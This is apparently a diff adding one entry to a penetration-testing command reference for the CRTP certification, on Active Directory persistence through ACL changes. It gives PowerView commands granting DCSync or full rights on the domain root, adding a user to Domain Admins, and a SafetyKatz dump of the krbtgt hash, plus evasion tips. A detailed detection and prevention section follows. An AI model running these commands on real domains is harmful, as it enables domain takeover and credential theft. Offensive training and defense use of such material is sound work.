@@ -1,0 +1,102 @@
+{
+  "id": "crtp-acl-persistence",
+  "name": "ACL-Based Persistence (Grant DCSync Rights)",
+  "command": "Add-DomainObjectAcl -TargetIdentity 'DC=<domain>,DC=local' -PrincipalIdentity '<user>' -Rights DCSync",
+  "description": "Grant DCSync rights (Replicating Directory Changes) or other AD rights to a controlled user via WriteDACL/GenericAll. Provides persistence that survives password changes.",
+  "platform": "windows",
+  "category": "Active Directory",
+  "subcategory": "Persistence",
+  "type": "command",
+  "certifications": [
+    "CRTP"
+  ],
+  "source": "CRTP",
+  "opsec": "quiet",
+  "mitre": [
+    "T1098",
+    "T1222.001"
+  ],
+  "tools": [
+    "PowerView"
+  ],
+  "tags": [
+    "acl",
+    "dcsync-rights",
+    "persistence",
+    "powerview",
+    "writedacl",
+    "genericall"
+  ],
+  "steps": [
+    {
+      "label": "Grant DCSync rights to controlled user",
+      "command": "Add-DomainObjectAcl -TargetIdentity 'DC=corp,DC=local' -PrincipalIdentity '<user>' -Rights DCSync"
+    },
+    {
+      "label": "Or grant GenericAll on domain root",
+      "command": "Add-DomainObjectAcl -TargetIdentity 'DC=corp,DC=local' -PrincipalIdentity '<user>' -Rights All"
+    },
+    {
+      "label": "Add user to DA group",
+      "command": "Add-DomainGroupMember -Identity 'Domain Admins' -Members '<user>'"
+    },
+    {
+      "label": "Verify DCSync works",
+      "command": "SafetyKatz.exe \"lsadump::dcsync /user:<domain>\\krbtgt\" \"exit\""
+    }
+  ],
+  "examples": [
+    {
+      "label": "Grant DCSync rights",
+      "command": "Add-DomainObjectAcl -TargetIdentity 'DC=corp,DC=local' -PrincipalIdentity 'jdoe' -Rights DCSync"
+    },
+    {
+      "label": "Grant GenericAll on domain root",
+      "command": "Add-DomainObjectAcl -TargetIdentity 'DC=corp,DC=local' -PrincipalIdentity 'jdoe' -Rights All"
+    },
+    {
+      "label": "Add to Domain Admins directly",
+      "command": "Add-DomainGroupMember -Identity 'Domain Admins' -Members 'jdoe'"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "crtp-dcsync",
+      "note": "DCSync immediately with newly granted rights",
+      "rel": "next"
+    },
+    {
+      "id": "crtp-adminsdholder",
+      "note": "AdminSDHolder for persistent DA-equivalent rights",
+      "rel": "alternative"
+    },
+    {
+      "id": "crtp-powerview-acls",
+      "note": "Verify ACL was set correctly",
+      "rel": "next"
+    }
+  ],
+  "notes": "ACL changes persist until explicitly removed. WriteDACL on domain root = ability to grant yourself DCSync rights. Harder to detect than group membership.",
+  "references": [
+    {
+      "title": "CRTP - ACL Persistence",
+      "url": "https://www.alteredsecurity.com/adlab"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Active Directory ACLs on the domain object control who can perform privileged operations like DCSync. If an attacker adds 'Replicating Directory Changes' and 'Replicating Directory Changes All' rights to a low-privilege account, that account can DCSync indefinitely \u2014 even after DA password resets. The ACL change is a subtle, persistence-focused technique that survives most incident response activities.",
+    "prerequisites": "Domain Admin or WriteDACL rights on the domain object (NC). PowerView or AD DACL manipulation. The target account to receive DCSync rights.",
+    "impact": "T1098 Account Manipulation + T1222.001 File and Directory Permissions Modification: Windows. Grants long-term DCSync capability to a normal-looking account. Survives DA password rotations. Hard to detect unless AD object auditing is enabled and SIEM alerts on DCSync right grants.",
+    "detection": "Event 5136 (AD object modified) on the domain NC object: attribute nTSecurityDescriptor changed to add replication ACE. Event 4662 on domain NC with ObjectAceType containing DCSync GUIDs when the right is used. MDI: 'Sensitive attribute added to user' or 'DCSync attack' when used. SIEM: Event 5136 on domain NC with replication-right ACE added from a non-DC source.\nAccount attribute changes (password set, group membership, servicePrincipalName, logon hours) correlated with unusual process lineage or timing (DET0096/AN0265).\nUse of usermod, passwd, groupmod on Linux to escalate permissions or persist access on existing users (AN0266).\nModifications to user accounts via dscl, pwpolicy, or sysadminctl on macOS that alter groups, enable root, or bypass MDM (AN0267).\nModifications to SSO/SAML user attributes (isAdmin, role, MFA bypass) through CLI, API, or rogue IdP apps (AN0268).\nAddition of new users or role permission changes via API or vSphere Client from non-jumpbox IPs (AN0269).",
+    "artifacts": "Event 5136: domain NC nTSecurityDescriptor changed, replication ACE added | MDI: sensitive privilege grant / DCSync alert | Event 4662 with DCSync GUIDs when ACL is exercised | AD audit: non-default ACE on domain object",
+    "prevention": "Enable AD Directory Service Changes auditing (Event 5136). SIEM alert on ANY modification to domain NC ACL by non-DC accounts. Regularly audit domain NC ACL with Get-ObjectAcl / BloodHound 'Find Principals with DCSync Rights'. MDI deployment. Use Protected Users for DA accounts to limit damage from compromised credentials.\nDisable or Remove Feature or Program: Remove unnecessary authentication/authorization mechanisms.\nMulti-factor Authentication: Use MFA for all user and privileged accounts.\nNetwork Segmentation: Configure firewalls to limit access to critical systems and domain controllers; use VPCs in cloud environments.\nOperating System Configuration: Protect DCs with security config limiting SMB and other unnecessary protocols.\nPrivileged Account Management: Do not use domain admin accounts for day-to-day operations on unprivileged systems.\nRestrict File and Directory Permissions: Restrict access to files dealing with authentication/authorization.\nUser Account Management: Ensure low-privileged users cannot modify accounts or account-related policies.",
+    "evasion": "Add rights to a dormant or service-looking account ('svc_monitoring') to avoid immediate scrutiny. Make the ACL change during a change window. Remove the rights after use (though this generates another Event 5136).",
+    "sources": [
+      "https://attack.mitre.org/techniques/T1098/",
+      "https://attack.mitre.org/techniques/T1222/001/"
+    ],
+    "misconfiguration": "No AD object auditing (Event 5136 not enabled). No SIEM alert on domain NC ACL changes. No quarterly ACL audit for DCSync rights.",
+    "vulnerable_config": "# No audit on AD object changes:\n# Advanced Audit Policy: DS Access \u2192 Audit Directory Service Changes: NOT CONFIGURED\n# \u2192 Event 5136 not generated \u2192 ACL changes invisible\n\n# DCSync right added silently:\nAdd-ObjectAcl -PrincipalIdentity backdoor_account -Rights DCSync\n# No event generated if DS auditing disabled",
+    "secure_config": "# Enable DS Access auditing via GPO:\n# Computer Config \u2192 Windows Settings \u2192 Security Settings \u2192 Advanced Audit Policy\n# \u2192 DS Access \u2192 Audit Directory Service Changes: Success,Failure\n\n# SIEM rule:\n# EventID=5136 AND ObjectDN='DC=corp,DC=local' AND AttributeLDAPDisplayName='nTSecurityDescriptor'\n# \u2192 CRITICAL ALERT: domain ACL changed\n\n# Quarterly DCSync right audit:\nGet-ObjectAcl 'DC=corp,DC=local' -ResolveGUIDs | Where-Object {\n  $_.ObjectAceType -match 'DS-Replication-Get-Changes' -and\n  $_.IdentityReference -notmatch 'Enterprise Domain Controllers|ENTERPRISE DOMAIN CONTROLLERS'\n} | Format-List IdentityReference,ObjectAceType"
+  }
+}
